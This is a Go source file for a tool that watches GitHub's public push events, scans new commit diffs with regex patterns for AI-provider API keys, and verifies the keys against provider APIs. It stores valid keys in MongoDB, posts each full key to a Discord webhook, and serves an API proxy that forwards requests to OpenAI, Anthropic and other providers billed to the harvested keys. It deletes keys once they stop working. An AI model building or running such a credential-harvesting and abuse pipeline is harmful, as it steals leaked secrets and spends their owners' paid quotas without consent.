                        req.Header.Set("Authorization", "Bearer "+token)
                }

                resp, err := client.Do(req)
                if err != nil {
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }

                if resp.StatusCode != http.StatusOK {
                        resp.Body.Close()
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }

                scanner := bufio.NewScanner(resp.Body)
                lineNumber := 0

                for scanner.Scan() {
                        lineNumber++
                        lineText := scanner.Text()

                        // Only scan added lines in the diff (lines starting with +, not +++ headers)
                        if len(lineText) > 0 && lineText[0] == '+' && (len(lineText) < 3 || lineText[:3] != "+++") {
                                for _, rule := range rules {
                                        if rule.Regex.MatchString(lineText) {
                                                key := extractKey(lineText, &rule)
                                                if key == "" {
                                                        key = rule.Regex.FindString(lineText)
                                                }
                                                if key != "" {
                                                        rawChan <- RawMatch{
                                                                Rule:      rule.Name,
                                                                Provider:  rule.Provider,
                                                                Text:      key,
                                                                Repo:      job.RepoName,
                                                                CommitUrl: job.CommitUrl,
                                                                CanVerify: rule.CanVerify,
                                                        }
                                                        p.Send(MsgRawMatchFound{
                                                                Rule:      rule.Name,
                                                                Provider:  rule.Provider,
                                                                Text:      key,
                                                                Repo:      job.RepoName,
                                                                CommitUrl: job.CommitUrl,
                                                                CanVerify: rule.CanVerify,
                                                        })
                                                }
                                        }
                                }
                        }
                }
                resp.Body.Close()
                p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
        }
}

// ─── Build Default Rules ────────────────────────────────────────────────────

func buildDefaultRules() []struct {
        Name      string
        Pattern   string
        Provider  string
        CanVerify bool
} {
        return []struct {
                Name      string
                Pattern   string
                Provider  string
                CanVerify bool
        }{
                // ═══════════════════════════════════════════════════════════════════
                // ── AI / LLM Providers ONLY — no false positives ──
                // ═══════════════════════════════════════════════════════════════════

                // OpenAI — two patterns: new project keys and legacy keys
                {"OpenAI API Key (project)", `sk-proj-[A-Za-z0-9_-]{40,}`, "openai", true},
                {"OpenAI API Key (legacy)", `sk-[A-Za-z0-9]{48}`, "openai", true},
                {"OpenAI Key in .env", `(?:OPENAI_API_KEY|openai_api_key)\s*[=:]\s*["']?sk-[A-Za-z0-9_-]{20,}`, "openai", true},

                // Anthropic — distinctive sk-ant- prefix
                {"Anthropic API Key", `sk-ant-api03-[A-Za-z0-9\-_]{80,}`, "anthropic", true},
                {"Anthropic API Key (short)", `sk-ant-[A-Za-z0-9\-_]{20,}`, "anthropic", true},
                {"Anthropic Key in .env", `(?:ANTHROPIC_API_KEY|anthropic_api_key)\s*[=:]\s*["']?sk-ant-[A-Za-z0-9\-_]{20,}`, "anthropic", true},

                // Mistral — only match in env context (too generic standalone)
                {"Mistral Key in .env", `(?:MISTRAL_API_KEY|mistral_api_key)\s*[=:]\s*["']?[A-Za-z0-9]{20,}`, "mistral", true},

                // OpenRouter — distinctive sk-or-v1- prefix
                {"OpenRouter API Key", `sk-or-v1-[a-z0-9]{64}`, "openrouter", true},

                // ElevenLabs — distinctive sk_ prefix (lowercase only)
                {"ElevenLabs API Key", `sk_[a-z0-9]{48}`, "elevenlabs", true},

                // DeepSeek — sk- followed by exactly 32 hex chars
                {"DeepSeek API Key", `sk-[a-f0-9]{32}`, "deepseek", true},

                // xAI / Grok — distinctive xai- prefix
                {"xAI / Grok API Key", `xai-[A-Za-z0-9]{80}`, "xai", true},

                // HuggingFace — distinctive hf_ prefix
                {"HuggingFace API Token", `hf_[A-Za-z0-9]{34}`, "huggingface", true},

                // Groq — distinctive gsk_ prefix
                {"Groq API Key", `gsk_[A-Za-z0-9]{48,}`, "groq", true},

                // Together AI — only match in env context
                {"Together AI Key in .env", `(?:TOGETHER_API_KEY|together_api_key)\s*[=:]\s*["']?[a-f0-9]{64}`, "together", true},

                // Replicate — distinctive r8_ prefix
                {"Replicate API Token", `r8_[A-Za-z0-9]{30,}`, "replicate", true},

                // Perplexity — distinctive pplx- prefix
                {"Perplexity API Key", `pplx-[a-f0-9]{48}`, "perplexity", true},

                // Fireworks AI — distinctive fw_ prefix
                {"Fireworks AI Key", `fw_[A-Za-z0-9]{30,}`, "fireworks", true},

                // Cohere — only match in env context
                {"Cohere Key in .env", `(?:COHERE_API_KEY|cohere_api_key)\s*[=:]\s*["']?[A-Za-z0-9]{40}`, "cohere", true},

                // AI21 Labs — only match in env context
                {"AI21 Key in .env", `(?:AI21_API_KEY|ai21_api_key)\s*[=:]\s*["']?[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}`, "ai21", true},
        }
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
        // Redirect logger to file so it doesn't mess up the TUI (headless mode logs to stdout)
        if isHeadless() {
                log.SetOutput(os.Stdout)
                log.SetFlags(log.LstdFlags | log.Lmsgprefix)
                log.SetPrefix("[scanner] ")
        } else {
                logFile, err := os.OpenFile("scanner.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0666)
                if err != nil {
                        log.SetOutput(io.Discard)
                } else {
                        log.SetOutput(logFile)
                        defer logFile.Close()
                }
        }

        var cfg Config
        if err := initConfig(&cfg); err != nil {
                log.Printf("failed to init config: %v", err)
        }

        // ── Initialize Key Store ──
        if cfg.MongoDBURI == "" {
                log.Fatal("MONGODB_URI is required")
        }
        keyStore = NewKeyStore(cfg.MongoDBURI)

        // ── Initialize Settings ──
        appSettings = defaultSettings(cfg)

        // ── Build Rules ──
        var rules []Rule

        // If user defined signatures in config, use those
        if len(cfg.Signatures) > 0 {
                for name, pattern := range cfg.Signatures {
                        compiled, err := regexp.Compile(pattern)
                        if err != nil {
                                log.Fatalf("Invalid regex %s: %v", pattern, err)
                        }
                        // Try to detect provider from name for verification
                        provider := detectProvider(name, pattern)
                        canVerify := isVerifiable(provider)
                        rules = append(rules, Rule{
                                Name:      name,
                                Regex:     compiled,
                                CanVerify: canVerify,
                                Provider:  provider,
                        })
                }
        } else {
                // Use built-in comprehensive rules
                defaults := buildDefaultRules()
                for _, d := range defaults {
                        compiled, err := regexp.Compile(d.Pattern)
                        if err != nil {
                                log.Printf("Skipping invalid default regex %s: %v", d.Pattern, err)
                                continue
                        }
                        rules = append(rules, Rule{
                                Name:      d.Name,
                                Regex:     compiled,
                                CanVerify: d.CanVerify,
                                Provider:  d.Provider,
                        })
                }
        }
        log.Printf("Loaded %d rules (%d verifiable)", len(rules), countVerifiable(rules))

        // ── Token Pool ──
        tokenPool := NewTokenPool(cfg.GitHubToken)
        log.Printf("Token pool: %d GitHub tokens loaded", tokenPool.Count())

        // ── Channels ──
        scanJobs := make(chan ScanJob, 200)
        rawMatches := make(chan RawMatch, 500)

        // ── Workers ──
        numScanWorkers := 100
        numVerifyWorkers := cfg.VerifyWorkers
        if numVerifyWorkers < 1 {
                numVerifyWorkers = 20
        }

        // ── Headless vs TUI mode ──
        if isHeadless() {
                runHeadless(cfg, rules, tokenPool, scanJobs, rawMatches, numScanWorkers, numVerifyWorkers)
        } else {
                runTUI(cfg, rules, tokenPool, scanJobs, rawMatches, numScanWorkers, numVerifyWorkers)
        }
}

// ─── Headless Runner ────────────────────────────────────────────────────────

func runHeadless(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan ScanJob, rawMatches chan RawMatch, numScanWorkers, numVerifyWorkers int) {
        log.Println("Running in headless mode")
        log.Printf("Started %d scanning workers (%d tokens rotating)", numScanWorkers, tokenPool.Count())

        // Initialize dashboard state + WS hub
        dashboard = NewDashboardState()
        dashboard.TokenCount = tokenPool.Count()
        dashboard.ScanWorkers = numScanWorkers
        dashboard.VerifyWorkers = numVerifyWorkers
        wsHub = NewWSHub()

        // Start web dashboard server
        port := os.Getenv("PORT")
        if port == "" {
                port = "8080"
        }
        startDashboardServer(port)

        webhook := NewHeadlessWebhookSender(cfg.DiscordWebhook)

        // Start scan workers
        for w := 1; w <= numScanWorkers; w++ {
                go headlessScanWorker(w, scanJobs, rules, rawMatches, tokenPool)
        }

        // Start verify workers
        var verifyWg sync.WaitGroup
        for w := 1; w <= numVerifyWorkers; w++ {
                verifyWg.Add(1)
                go headlessVerifyWorker(w, rawMatches, webhook, cfg, &verifyWg)
        }
        log.Printf("Started %d verification workers", numVerifyWorkers)

        // GitHub Events Poller
        pollEvents(scanJobs, tokenPool, nil)

        // Periodic WebSocket broadcast
        go func() {
                ticker := time.NewTicker(2 * time.Second)
                for range ticker.C {
                        broadcastWSSnapshot()
                }
        }()

        // Start daily validation cron
        if appSettings.AutoValidate {
                go startValidationCron(cfg)
        }

        // Block forever (workers run indefinitely)
        select {}
}

// ─── TUI Runner (local dev) ────────────────────────────────────────────────

func runTUI(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan ScanJob, rawMatches chan RawMatch, numScanWorkers, numVerifyWorkers int) {
        initialModel := tuiModel{
                status:        "Initializing...",
                activeWorkers: numScanWorkers + numVerifyWorkers,
                tokenCount:    tokenPool.Count(),
        }
        p := tea.NewProgram(initialModel)

        webhook := NewWebhookSender(cfg.DiscordWebhook, p)

        for w := 1; w <= numScanWorkers; w++ {
                go scanWorker(w, p, scanJobs, rules, rawMatches, tokenPool)
        }
        log.Printf("Started %d scanning workers (%d tokens rotating)", numScanWorkers, tokenPool.Count())

        var verifyWg sync.WaitGroup
        for w := 1; w <= numVerifyWorkers; w++ {
                verifyWg.Add(1)
                go verifyWorker(w, p, rawMatches, webhook, cfg, &verifyWg)
        }
        log.Printf("Started %d verification workers", numVerifyWorkers)

        // GitHub Events Poller (shared with headless)
        go pollEvents(scanJobs, tokenPool, p)

        if _, err := p.Run(); err != nil {
                log.Printf("Error running TUI: %v", err)
                os.Exit(1)
        }
}

// ─── Shared Events Poller ──────────────────────────────────────────────────

func pollEvents(scanJobs chan ScanJob, tokenPool *TokenPool, p *tea.Program) {
        client := &http.Client{Timeout: 30 * time.Second}
        url := "https://api.github.com/events?per_page=100"
        var lastETag string
        pollInterval := 60 * time.Second
        processedCommits := make(map[string]bool)

        for {
                if p != nil {
                        p.Send(MsgStatusUpdate{Status: "Fetching events..."})
                } else {
                        log.Println("Fetching events...")
                }

                req, _ := http.NewRequest("GET", url, nil)
                req.Header.Set("User-Agent", "scanner")
                token := tokenPool.Next()
                if token != "" {
                        req.Header.Set("Authorization", "Bearer "+token)
                }
                if lastETag != "" {
                        req.Header.Add("If-None-Match", lastETag)
                }
                resp, err := client.Do(req)
                if err != nil {
                        log.Printf("Error fetching events: %v", err)
                        if p != nil {
                                p.Send(MsgStatusUpdate{Status: fmt.Sprintf("Error fetching events: %v", err)})
                        }
                        time.Sleep(pollInterval)
                        continue
                }

                // Parse Rate Limits
                if limitStr := resp.Header.Get("X-Ratelimit-Limit"); limitStr != "" {
                        var limit, remain int
                        fmt.Sscanf(limitStr, "%d", &limit)
                        if remainStr := resp.Header.Get("X-Ratelimit-Remaining"); remainStr != "" {
                                fmt.Sscanf(remainStr, "%d", &remain)
                                if p != nil {
                                        p.Send(MsgRateLimit{Limit: limit, Remaining: remain})
                                } else {
                                        log.Printf("Rate limit: %d/%d", remain, limit)
                                        if dashboard != nil {
                                                dashboard.SetRateLimit(remain, limit)
                                        }
                                }
                        }
                }

                if resp.StatusCode == http.StatusNotModified {
                        resp.Body.Close()
                        if p != nil {
                                p.Send(MsgStatusUpdate{Status: "Events not modified."})
                        } else {
                                log.Println("Events not modified.")
                        }
                        time.Sleep(pollInterval)
                        continue
                }
                if resp.StatusCode != http.StatusOK {
                        log.Printf("Unexpected status code fetching events: %d", resp.StatusCode)
                        if p != nil {
                                p.Send(MsgStatusUpdate{Status: fmt.Sprintf("HTTP %d error", resp.StatusCode)})
                        }
                        resp.Body.Close()
                        time.Sleep(pollInterval)
                        continue
                }
                lastETag = resp.Header.Get("ETag")

                var events []map[string]any
                if err := json.NewDecoder(resp.Body).Decode(&events); err != nil {
                        log.Printf("Error unmarshalling events: %v", err)
                        resp.Body.Close()
                        time.Sleep(pollInterval)
                        continue
                }
                resp.Body.Close()

                if p != nil {
                        p.Send(MsgStatusUpdate{Status: "Processing events..."})
                } else {
                        log.Println("Processing events...")
                }

                newCommitsCount := 0
                for _, event := range events {
                        eventType, _ := event["type"].(string)
                        if eventType != "PushEvent" {
                                continue
                        }
                        repo, _ := event["repo"].(map[string]any)
                        repoName, _ := repo["name"].(string)
                        payload, _ := event["payload"].(map[string]any)
                        sha, ok := payload["head"].(string)
                        if !ok || sha == "" {
                                continue
                        }
                        if processedCommits[sha] {
                                continue
                        }
                        processedCommits[sha] = true
                        newCommitsCount++

                        patchUrl := fmt.Sprintf("https://api.github.com/repos/%s/commits/%s", repoName, sha)
                        scanJobs <- ScanJob{
                                RepoName:  repoName,
                                CommitUrl: patchUrl,
                        }
                }
                if p != nil {
                        p.Send(MsgFetchedCommits{Count: newCommitsCount})
                        p.Send(MsgStatusUpdate{Status: fmt.Sprintf("Fetched %d events (%d new push commits)", len(events), newCommitsCount)})
                } else {
                        log.Printf("Fetched %d events (%d new push commits)", len(events), newCommitsCount)
                        if dashboard != nil {
                                dashboard.AddFound(newCommitsCount)
                                dashboard.SetStatus(fmt.Sprintf("Fetched %d events (%d new push commits)", len(events), newCommitsCount))
                        }
                }

                if intervalStr := resp.Header.Get("X-Poll-Interval"); intervalStr != "" {
                        if duration, err := time.ParseDuration(intervalStr + "s"); err == nil {
                                pollInterval = duration
                        }
                }

                time.Sleep(pollInterval)
        }
}

// ─── Headless Webhook Sender ───────────────────────────────────────────────

type HeadlessWebhookSender struct {
        url     string
        enabled bool
        client  *http.Client
}

func NewHeadlessWebhookSender(url string) *HeadlessWebhookSender {
        return &HeadlessWebhookSender{
                url:     url,
                enabled: url != "",
                client:  &http.Client{Timeout: 10 * time.Second},
        }
}

func (w *HeadlessWebhookSender) Send(match VerifiedMatch) {
        if !w.enabled {
                return
        }
        go func() {
                color := 0x04B575
                statusLabel := "VALID"
                if !match.Valid {
                        color = 0xFF5555
                        statusLabel = "INVALID"
                }

                fullKey := match.Key
                if fullKey == "" {
                        fullKey = match.Redacted
                }

                emoji := providerEmoji(match.Provider)
                fields := []DiscordEmbedField{
                        {Name: "Status", Value: statusLabel, Inline: true},
                        {Name: "Provider", Value: fmt.Sprintf("%s %s", emoji, strings.Title(match.Provider)), Inline: true},
                }
                if match.KeyType != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Type", Value: match.KeyType, Inline: true})
                }
                keyDisplay := fullKey
                if len(keyDisplay) > 1000 {
                        keyDisplay = keyDisplay[:1000] + "..."
                }
                fields = append(fields, DiscordEmbedField{Name: "Key", Value: fmt.Sprintf("```%s```", keyDisplay), Inline: false})
                if match.Org != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Org", Value: match.Org, Inline: true})
                }
                if match.Models != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Models", Value: match.Models, Inline: true})
                }
                if match.Balance != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Balance", Value: match.Balance, Inline: true})
                }
                if match.Quota != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Quota", Value: match.Quota, Inline: true})
                }
                if match.Tier != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Tier", Value: match.Tier, Inline: true})
                }
                if match.Details != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Details", Value: match.Details, Inline: false})
                }
                fields = append(fields, DiscordEmbedField{Name: "Repo", Value: match.Repo, Inline: true})
                fields = append(fields, DiscordEmbedField{Name: "Commit", Value: match.CommitUrl, Inline: false})

                embed := DiscordEmbed{
                        Title:       fmt.Sprintf("%s %s Key Check", emoji, strings.Title(match.Provider)),
                        Description: fmt.Sprintf("**%s** key detected and verified", strings.Title(match.Provider)),
                        Color:       color,
                        Fields:      fields,
                        Footer:      &DiscordEmbedFooter{Text: "Key Scanner | Auto-Verified"},
                }
                payload := DiscordPayload{Embeds: []DiscordEmbed{embed}}
                jsonData, err := json.Marshal(payload)
                if err != nil {
                        log.Printf("Webhook marshal error: %v", err)
                        return
                }

                resp, err := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                if err != nil {
                        log.Printf("Webhook send error: %v", err)
                        return
                }
                resp.Body.Close()

                if resp.StatusCode == 429 {
                        log.Printf("Discord rate limited, retrying in 2s...")
                        time.Sleep(2 * time.Second)
                        resp2, err2 := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                        if err2 == nil {
                                resp2.Body.Close()
                                log.Printf("Webhook retry sent for %s key", match.Provider)
                        }
                } else if resp.StatusCode >= 300 {
                        log.Printf("Webhook returned status %d", resp.StatusCode)
                } else {
                        log.Printf("Webhook sent: %s key (%s)", match.Provider, statusLabel)
                }
        }()
}

// ─── Headless Scan Worker ──────────────────────────────────────────────────

func headlessScanWorker(id int, jobs <-chan ScanJob, rules []Rule, rawChan chan<- RawMatch, tokenPool *TokenPool) {
        client := &http.Client{Timeout: 30 * time.Second}
        for job := range jobs {
                log.Printf("[scan-%d] Scanning %s", id, job.CommitUrl)
                if dashboard != nil {
                        dashboard.AddScan(job.RepoName, job.CommitUrl)
                }
                req, err := http.NewRequest("GET", job.CommitUrl, nil)
                if err != nil {
                        continue
                }
                req.Header.Set("User-Agent", "scanner")
                req.Header.Set("Accept", "application/vnd.github.v3.diff")
                token := tokenPool.Next()
                if token != "" {
                        req.Header.Set("Authorization", "Bearer "+token)
                }

                resp, err := client.Do(req)
                if err != nil {
                        continue
                }
                if resp.StatusCode != http.StatusOK {
                        resp.Body.Close()
                        continue
                }

                scanner := bufio.NewScanner(resp.Body)
                for scanner.Scan() {
                        lineText := scanner.Text()
                        if len(lineText) > 0 && lineText[0] == '+' && (len(lineText) < 3 || lineText[:3] != "+++") {
                                for _, rule := range rules {
                                        if rule.Regex.MatchString(lineText) {
                                                key := extractKey(lineText, &rule)
                                                if key == "" {
                                                        key = rule.Regex.FindString(lineText)
                                                }
                                                if key != "" {
                                                        log.Printf("[scan-%d] Match: %s key in %s", id, rule.Provider, job.RepoName)
                                                        if dashboard != nil {
                                                                dashboard.AddRawHit()
                                                        }
                                                        rawChan <- RawMatch{
                                                                Rule:      rule.Name,
                                                                Provider:  rule.Provider,
                                                                Text:      key,
                                                                Repo:      job.RepoName,
                                                                CommitUrl: job.CommitUrl,
                                                                CanVerify: rule.CanVerify,
                                                        }
                                                }
                                        }
                                }
                        }
                }
                resp.Body.Close()
        }
}

// ─── Headless Verify Worker ────────────────────────────────────────────────

func headlessVerifyWorker(id int, rawChan <-chan RawMatch, webhook *HeadlessWebhookSender, cfg Config, wg *sync.WaitGroup) {
        defer wg.Done()
        timeout := time.Duration(cfg.VerifyTimeout) * time.Second

        for raw := range rawChan {
                if !raw.CanVerify || !cfg.EnableVerify {
                        log.Printf("[verify-%d] %s key (unverified) in %s", id, raw.Provider, raw.Repo)
                        if dashboard != nil {
                                verified := VerifiedMatch{
                                        Provider:  raw.Provider,
                                        Key:       raw.Text,
                                        Redacted:  redact(raw.Text, 6),
                                        Valid:     true,
                                        Status:    "regex-match (unverified)",
                                        Details:   "not verified",
                                        Repo:      raw.Repo,
                                        CommitUrl: raw.CommitUrl,
                                }
                                dashboard.AddVerifiedKey(verified)
                        }
                        continue
                }

                vr := verifyKey(raw.Provider, raw.Text, timeout)
                verified := VerifiedMatch{
                        Provider:  raw.Provider,
                        Key:       raw.Text,
                        Redacted:  redact(raw.Text, 6),
                        Valid:     vr.Valid,
                        Status:    "verified",
                        Details:   vr.Details,
                        Balance:   vr.Balance,
                        Quota:     vr.Quota,
                        Tier:      vr.Tier,
                        KeyType:   vr.KeyType,
                        Org:       vr.Org,
                        Models:    vr.Models,
                        Repo:      raw.Repo,
                        CommitUrl: raw.CommitUrl,
                }
                if !vr.Valid {
                        verified.Status = "invalid"
                        log.Printf("[verify-%d] INVALID %s key in %s: %s", id, raw.Provider, raw.Repo, vr.Details)
                } else {
                        log.Printf("[verify-%d] VALID %s key in %s | %s | %s | %s | %s", id, raw.Provider, raw.Repo, vr.Details, vr.Balance, vr.Quota, vr.Tier)
                }

                // Update dashboard
                if dashboard != nil {
                        dashboard.AddVerifiedKey(verified)
                        if vr.Valid {
                                dashboard.AddWebhookOK()
                        }
                }

                // Save to KeyStore — only valid keys
                if vr.Valid {
                        entry := keyStore.AddKey(raw.Provider, raw.Text, raw.Repo, raw.CommitUrl)
                        keyStore.UpdateKey(entry.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
                }

                // Broadcast via WebSocket (both valid + invalid for activity feed)
                if wsHub != nil {
                        wsHub.Broadcast("newKey", verified)
                }

                // Send to Discord webhook — ONLY verified (valid) keys
                if vr.Valid && cfg.DiscordWebhook != "" {
                        webhook.Send(verified)
                }
        }
}

// ─── Provider Detection Helpers ─────────────────────────────────────────────

func detectProvider(name, pattern string) string {
        n := strings.ToLower(name)
        p := strings.ToLower(pattern)

        switch {
        case strings.Contains(n, "openai") || strings.Contains(p, "sk-[a-za-z0-9_-]"):
                return "openai"
        case strings.Contains(n, "anthropic") || strings.Contains(p, "sk-ant-"):
                return "anthropic"
        case strings.Contains(n, "mistral"):
                return "mistral"
        case strings.Contains(n, "openrouter") || strings.Contains(p, "sk-or-"):
                return "openrouter"
        case strings.Contains(n, "elevenlabs") || strings.Contains(p, "xi-api-key"):
                return "elevenlabs"
        case strings.Contains(n, "deepseek"):
                return "deepseek"
        case strings.Contains(n, "xai"):
                return "xai"
        case strings.Contains(n, "github") || strings.Contains(p, "ghp_") || strings.Contains(p, "gho_") || strings.Contains(p, "github_pat_"):
                return "github"
        case strings.Contains(n, "aws") || strings.Contains(p, "akia"):
                return "aws"
        case strings.Contains(n, "azure"):
                return "azure"
        case strings.Contains(n, "stripe") || strings.Contains(p, "sk_live") || strings.Contains(p, "rk_live"):
                return "stripe"
        case strings.Contains(n, "slack") || strings.Contains(p, "xox"):
                return "slack"
        case strings.Contains(n, "telegram") || strings.Contains(p, "telegram"):
                return "telegram"
        case strings.Contains(n, "heroku"):
                return "heroku"
        case strings.Contains(n, "cloudflare"):
                return "cloudflare"
        case strings.Contains(n, "private key") || strings.Contains(p, "private key"):
                return "private_key"
        case strings.Contains(n, "jwt") || strings.Contains(p, "eyj"):
                return "jwt"
        default:
                return "unknown"
        }
}

func isVerifiable(provider string) bool {
        switch provider {
        case "openai", "anthropic", "mistral", "openrouter",
                "elevenlabs", "deepseek", "xai", "huggingface", "groq",
                "replicate", "perplexity", "together", "fireworks",
                "cohere", "ai21":
                return true
        default:
                return false
        }
}

func countVerifiable(rules []Rule) int {
        count := 0
        for _, r := range rules {
                if r.CanVerify {
                        count++
                }
        }
        return count
}

// ─── API Proxy ─────────────────────────────────────────────────────────────

type ProviderConfig struct {
        BaseURL      string
        AuthHeader   string
        AuthPrefix   string
        ExtraHeaders map[string]string
}

var providerConfigs = map[string]ProviderConfig{
        "openai":      {BaseURL: "https://api.openai.com", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "anthropic":   {BaseURL: "https://api.anthropic.com", AuthHeader: "x-api-key", AuthPrefix: "", ExtraHeaders: map[string]string{"anthropic-version": "2023-06-01"}},
        "deepseek":    {BaseURL: "https://api.deepseek.com", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "mistral":     {BaseURL: "https://api.mistral.ai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "groq":        {BaseURL: "https://api.groq.com/openai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "openrouter":  {BaseURL: "https://openrouter.ai/api", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "xai":         {BaseURL: "https://api.x.ai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "together":    {BaseURL: "https://api.together.xyz", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "fireworks":   {BaseURL: "https://api.fireworks.ai/inference", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "perplexity":  {BaseURL: "https://api.perplexity.ai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "huggingface": {BaseURL: "https://api-inference.huggingface.co", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "replicate":   {BaseURL: "https://api.replicate.com", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "cohere":      {BaseURL: "https://api.cohere.ai", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
        "elevenlabs":  {BaseURL: "https://api.elevenlabs.io", AuthHeader: "xi-api-key", AuthPrefix: ""},
        "ai21":        {BaseURL: "https://api.ai21.com", AuthHeader: "Authorization", AuthPrefix: "Bearer "},
}

func handleAPIProxy(w http.ResponseWriter, r *http.Request) {
        if !appSettings.ProxyEnabled {
                http.Error(w, "Proxy disabled", http.StatusServiceUnavailable)
                return
        }

        // Parse path: /api/{provider}/v1/{rest...}
        pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/"), "/")
        if len(pathParts) < 3 {
                http.Error(w, "Invalid proxy path", http.StatusBadRequest)
                return
        }
        provider := pathParts[0]
        // pathParts[1] should be "v1"
        restPath := strings.Join(pathParts[1:], "/")

        config, ok := providerConfigs[provider]
        if !ok {
                http.Error(w, fmt.Sprintf("Unknown provider: %s", provider), http.StatusBadRequest)
                return
        }

        // Try up to 3 keys
        for attempt := 0; attempt < 3; attempt++ {
                bestKey := keyStore.GetBestKey(provider)
                if bestKey == nil {
                        http.Error(w, fmt.Sprintf("No valid keys available for %s", provider), http.StatusServiceUnavailable)
                        return
                }

                // Build target URL
                targetURL := config.BaseURL + "/" + restPath
                if r.URL.RawQuery != "" {
                        targetURL += "?" + r.URL.RawQuery
                }

                // Read request body
                bodyBytes, err := io.ReadAll(r.Body)
                if err != nil {
                        http.Error(w, "Failed to read request body", http.StatusInternalServerError)
                        return
                }
                r.Body.Close()

                // Create outgoing request
                proxyReq, err := http.NewRequest(r.Method, targetURL, bytes.NewBuffer(bodyBytes))
                if err != nil {
                        http.Error(w, "Failed to create proxy request", http.StatusInternalServerError)
                        return
                }

                // Copy headers from original request
                for key, values := range r.Header {
                        for _, value := range values {
                                // Skip host and auth headers - we'll set our own
                                if strings.EqualFold(key, "Host") || strings.EqualFold(key, config.AuthHeader) {
                                        continue
                                }
                                proxyReq.Header.Add(key, value)
                        }
                }

                // Set auth header
                proxyReq.Header.Set(config.AuthHeader, config.AuthPrefix+bestKey.KeyValue)

                // Set extra headers
                for k, v := range config.ExtraHeaders {
                        proxyReq.Header.Set(k, v)
                }

                proxyReq.Header.Set("Host", proxyReq.URL.Host)

                // Send request
                client := &http.Client{Timeout: 120 * time.Second}
                resp, err := client.Do(proxyReq)
                if err != nil {
                        http.Error(w, fmt.Sprintf("Proxy request failed: %v", err), http.StatusBadGateway)
                        return
                }

                // If 401/403, delete key and try next
                if resp.StatusCode == 401 || resp.StatusCode == 403 {
                        resp.Body.Close()
                        keyStore.DeleteKey(bestKey.ID)
                        log.Printf("[proxy] Key %d for %s returned %d, deleted", bestKey.ID, provider, resp.StatusCode)
                        if wsHub != nil {
                                wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                        "id":     bestKey.ID,
                                        "status": "deleted",
                                })
                        }
                        continue
                }

                // Mark key as used
                keyStore.MarkUsed(bestKey.ID)

                // Copy response headers
                for key, values := range resp.Header {
                        for _, value := range values {
                                w.Header().Add(key, value)
                        }
                }
                w.WriteHeader(resp.StatusCode)

                // Stream response body
                flusher, canFlush := w.(http.Flusher)
                buf := make([]byte, 32*1024)
                for {
                        n, err := resp.Body.Read(buf)
                        if n > 0 {
                                w.Write(buf[:n])
                                if canFlush {
                                        flusher.Flush()
                                }
                        }
                        if err != nil {
                                break
                        }
                }
                resp.Body.Close()
                return
        }

        http.Error(w, "All keys exhausted for "+provider, http.StatusServiceUnavailable)
}

// ─── Daily Validation Cron ─────────────────────────────────────────────────

func startValidationCron(cfg Config) {
        intervalStr := appSettings.ValidateInterval
        if intervalStr == "" {
                intervalStr = "24h"
        }
        interval, err := time.ParseDuration(intervalStr)
        if err != nil {
                interval = 24 * time.Hour
        }

        log.Printf("[cron] Starting validation cron with interval: %s", interval)
        ticker := time.NewTicker(interval)
        for range ticker.C {
                if !appSettings.AutoValidate {
                        continue
                }
                log.Println("[cron] Starting daily re-validation of all valid keys...")
                validateAllKeys(cfg)
        }
}

func validateAllKeys(cfg Config) {
        timeout := time.Duration(cfg.VerifyTimeout) * time.Second
        keys := keyStore.GetValidKeys("")
        log.Printf("[cron] Re-validating %d valid keys", len(keys))

        for _, k := range keys {
                vr := verifyKey(k.Provider, k.KeyValue, timeout)
                if !vr.Valid {
                        keyStore.DeleteKey(k.ID)
                        log.Printf("[cron] Key %d (%s) is now invalid, deleted: %s", k.ID, k.Provider, vr.Details)
                        if wsHub != nil {
                                wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                        "id":     k.ID,
                                        "status": "deleted",
                                })
                        }
                } else {
                        keyStore.UpdateKey(k.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
                        if wsHub != nil {
                                wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                        "id":      k.ID,
                                        "status":  "valid",
                                        "balance": vr.Balance,
                                })
                        }
                }
        }
        log.Println("[cron] Re-validation complete")
}

func validateSingleKey(id int, cfg Config) {
        k := keyStore.GetKeyByID(id)
        if k == nil {
                return
        }
        timeout := time.Duration(cfg.VerifyTimeout) * time.Second
        vr := verifyKey(k.Provider, k.KeyValue, timeout)
        if !vr.Valid {
                keyStore.DeleteKey(k.ID)
                if wsHub != nil {
                        wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                "id":     k.ID,
                                "status": "deleted",
                        })
                }
        } else {
